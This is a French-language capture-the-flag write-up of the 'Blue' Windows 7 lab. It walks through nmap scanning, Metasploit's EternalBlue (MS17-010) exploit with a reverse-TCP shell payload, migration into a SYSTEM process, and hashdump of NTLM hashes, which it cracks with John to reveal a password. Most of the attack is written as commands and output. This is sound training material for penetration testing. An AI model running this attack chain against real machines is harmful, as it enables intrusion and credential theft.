---
aliasses: Blue
tags:
  - Windows
  - Windows7
  - Exploit
  - EternalBlue
  - John
  - Metasploit
  - nmap
---
Deploy & hack into a Windows machine, leveraging common misconfigurations issues.
## Reconnaissance

**nmap -sS -sV -sC -A -p- 10.10.26.169**

	PORT      STATE SERVICE            VERSION
	135/tcp   open  msrpc              Microsoft Windows RPC
	139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
	445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
	3389/tcp  open  ssl/ms-wbt-server?
	49152/tcp open  msrpc              Microsoft Windows RPC
	49153/tcp open  msrpc              Microsoft Windows RPC
	49154/tcp open  msrpc              Microsoft Windows RPC
	49158/tcp open  msrpc              Microsoft Windows RPC
	49160/tcp open  msrpc              Microsoft Windows RPC

	HOST SCRIPT RESULTS:
	| smb-os-discovery: 
	|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
	|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
	|   Computer name: Jon-PC
	|   NetBIOS computer name: JON-PC\x00
	|   Workgroup: WORKGROUP\x00
	|_  System time: 2024-09-30T07:10:09-05:00
	|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02c7bfb92a2d (unknown)
	| smb2-security-mode: 
	|   210: 
	|_    Message signing enabled but not required
	| smb-security-mode: 
	|   account_used: guest
	|   authentication_level: user
	|   challenge_response: supported
	|_  message_signing: disabled (dangerous, but default)
	| smb2-time: 
	|   date: 2024-09-30T12:10:09
	|_  start_date: 2024-09-30T12:06:40

On remarque que cet OS Windows 7 dans cette version 7601 Service Pack 1 est vulnérable à l'exploit [[MS17-010|EternalBlue]] ou [[MS17-010]].

## Gain d'accès sur la cible

L'exploit de cette vulnérabilité est disponible par défaut dans [[Metasploit]] sur le chemin "/exploit/windows/smb/ms17_010_eternalblue".

	msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.26.169
	msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
	msf6 exploit(windows/smb/ms17_010_eternalblue) > run

Après plusieurs reboot de la machine virtuelle et le setup du "DefangedMode" à false, l'exploit fonctionne et donne un meterpreter sur la cible.^DefangedMode

## Escalade de privilèges

Un module nommé "/multi/manage/shell_to_meterpreter" permet la conversion d'un [[Meterpreter]] en shell avec [[Metasploit]].
Le lancement de module en renseignant le paramètre "SESSION" permet d'upgrade le shell de cette session d'ID donné.

```
use /multi/manage/shell_to_meterpreter
show options
sessions -l
set SESSION [ID]
sessions -i [ID]
```

Une fois sur la cible avec le shell meterpreter, on peut ouvrir un shell dos en utilisant la commande : **shell**
On remarque en listant les processus avec [[ps]] qu'il y a des processus en cours d'exécution avec les droits NT AUTHORITY\SYSTEM vers lesquels il serait intéressant de migrer.

	meterpreter > ps
	
	Process List
	 PID   PPID  Name                  Arch  Session  User                          Path
	 ---   ----  ----                  ----  -------  ----                          ----
	 0     0     [System Process]
	 4     0     System                x64   0
	 100   664   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
	 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
	 568   560   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
	 664   608   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
	 728   616   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
	 908   712   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
	 956   712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
	 1292  712   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
	 1336  712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
	 1416  712   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
	 1488  712   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
	 1628  712   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
	 1952  712   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
	 2268  712   mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
	 2320  712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
	 2368  2268  mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
	 2548  712   vds.exe               x64   0        NT AUTHORITY\SYSTEM
	
	meterpreter > migrate 1416
	[*] Migrating from 1292 to 1416...
	[*] Migration completed successfully.

## Cracking

On utilise ensuite notre accès afin de dump les hashs des mots de passe sur la machine (sous réserve que nous y sommes autorisés).

	hashdump
	
	Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::

Par la suite on utilise [[John]] afin de craquer ces hashs et retrouver les mots de passe des différents comptes de la machine cible.

	john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT mdps.txt
	
	Loaded 2 password hashes with no different salts (NT [MD4 128/128 SSE2 4x3])
	Cracked 1 password hash (is in /opt/tools/john/run/john.pot), use "--show"
	alqfna22         (Jon)

On trouve le premier flag à la racine du volume "C:/" de la cible.
Le second est dans le dossier contenant les mots de passe Windows "C:/Windows/SYSTEM32/config" sous forme de fichiers nommés [[SAM]].
Enfin, le troisième se trouve dans les documents de l'utilisateur "Jon".